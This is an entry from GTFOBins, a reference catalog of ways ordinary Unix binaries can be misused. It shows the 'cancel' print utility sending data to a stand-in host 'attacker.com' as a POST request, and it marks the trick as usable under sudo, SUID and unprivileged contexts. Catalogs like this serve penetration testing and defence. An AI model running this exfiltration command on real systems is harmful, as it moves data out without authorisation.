<!-- source: https://github.com/GTFOBins/GTFOBins.github.io/blob/acd524623f9c406acedd2754ebd9c2431f3675ad/_gtfobins/cancel -->
---
functions:
  upload:
  - binary: false
    code: |-
      cancel -h attacker.com:12345 -u DATA
    comment: |-
      Data is sent as a POST request along with other content.
    contexts:
      sudo:
      suid:
      unprivileged:
...
